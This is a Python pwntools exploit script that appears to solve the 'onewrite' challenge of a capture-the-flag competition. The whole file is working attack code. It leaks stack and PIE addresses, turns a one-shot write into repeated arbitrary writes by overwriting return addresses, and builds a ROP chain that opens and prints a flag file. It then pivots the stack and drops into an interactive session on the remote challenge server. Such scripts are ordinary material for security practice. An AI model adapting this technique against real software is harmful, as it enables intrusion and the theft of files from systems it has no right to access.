from pwn import *

debug = False
local = args.LOCAL

context.binary = "./onewrite"
context.terminal = ['gnome-terminal', '--tab', '-e']


if local:
    io = process('./onewrite')
else:
    #io = remote('39.96.9.148', 9999)
    io = remote('onewrite.teaser.insomnihack.ch', 1337)

def make_break_str(blist):
    return "".join([ "b *{}\n".format(hex(i)) for i in blist])


pie_leak = 0
stack_leak = 0
breaks = [
  #  0x7ffff7d52a0f,
  #  0x7ffff7d52a0a,
  #  0x7ffff7d52a14,
   0x7ffff7d5346a
]

if debug and local:
    gdb.attach(io, """
    set disable-randomization on
	""" + make_break_str(breaks) + 'c')


def leak_stack():
    io.recvuntil("> ")
    io.sendline("1")
    line = io.recvline()
    addr = int(line, 16)
    log.info("Leaked stack addr {}".format(hex(addr)))
    return addr

def leak_pie():
    io.recvuntil("> ")
    io.sendline("2")
    line = io.recvline()
    addr = int(line, 16)
    log.info("Leaked pie addr {}".format(hex(addr)))
    return addr


def write_dword(addr, value):
    io.recvuntil("address : ")
    log.info("Writing {} at address {}.".format(hex(value), hex(addr)))
    io.send(str(int(addr)))
    io.recvuntil("data : ")
    io.send(p64(value))


pie_base_global = 0
stack_leak_global = 0

# get leaks
stack_leak = leak_stack();
write_dword(stack_leak-15, 0xb8AAAAAAAAAAAAAA)
if stack_leak_global == 0 :
    stack_leak_global = stack_leak
pie_leak = leak_pie()
pie_base = pie_leak - 0x8A15
if pie_base_global == 0:
    pie_base_global = pie_base
log.info("Elf loaded at {}".format(hex(pie_base)))
write_dword(stack_leak-48, pie_base + 0x0000000000089C3)
write_dword(stack_leak-0x18, pie_base + 0x0000000000089C3)
leak_pie()
write_dword(stack_leak-0x100,    0)
write_dword(stack_leak+8*1,     pie_base + 0x000000000008AB8)


def arbitrary_write(dst, value):

    stack_leak = leak_stack();
    write_dword(stack_leak-15, 0xb8AAAAAAAAAAAAAA)

    pie_leak = leak_pie()
    pie_base = pie_leak - 0x8A15

    log.info("Elf loaded at {}".format(hex(pie_base)))


    write_dword(stack_leak-48, pie_base + 0x0000000000089C3)
    write_dword(stack_leak-0x18, pie_base + 0x0000000000089C3)

    leak_pie()
    write_dword(dst,    value)
    write_dword(stack_leak+8*1,     pie_base + 0x000000000008AB8)

#arbitrary_write(stack_leak_global, 0x0000000000000000)


rebase_0 = lambda x : x + pie_base_global

exe = ELF('./onewrite')
exe.address = pie_base_global
rop = ROP(exe)
bss=exe.address + 0x00000000002b3300
rop.read(0, bss, 100)
#rop.execve(exe.address + 0x00000000002b3300, 0, 0)
rop.open(bss, 0)
rop.read(3, bss, 100)
rop.puts(bss)

log.info(rop.dump())

rop_addr = start_addr = stack_leak_global + 0xa8+8
for line in rop.build():
    context.log_level = 'error'
    arbitrary_write(start_addr, line)
    context.log_level = 'info'
    log.info("Writing rop address {} at {}!".format(hex(line), hex(start_addr)))
    start_addr += 8


pop_rsp_ret = pie_base_global + 0x000000000000946a

stack_leak = leak_stack();
write_dword(stack_leak-15, 0xb8AAAAAAAAAAAAAA)
pie_leak = leak_pie()
pie_base = pie_leak - 0x8A15
log.info("Elf loaded at {}".format(hex(pie_base)))
write_dword(stack_leak-48, pie_base + 0x0000000000089C3)
write_dword(stack_leak-0x18, pie_base + 0x0000000000089C3)
leak_pie()
write_dword(stack_leak+8*2,    rop_addr)
write_dword(stack_leak+8*1,     pop_rsp_ret)
io.send('/home/onewrite/flag\x00')


################################################################



# leak_pie()
# write_dword(stack_leak+8*2,     pie_base + 0x0000000000089C3)
# write_dword(0x7ffffffde000+8*3,     pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*5,     pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*6,     pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*7,     pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*8,     pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*9,     pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*10,    pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*11,    pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*12,    pie_base + 0x0000000000089C3)
# write_dword(stack_leak+8*13,    pie_base + 0x0000000000089C3)
io.interactive()
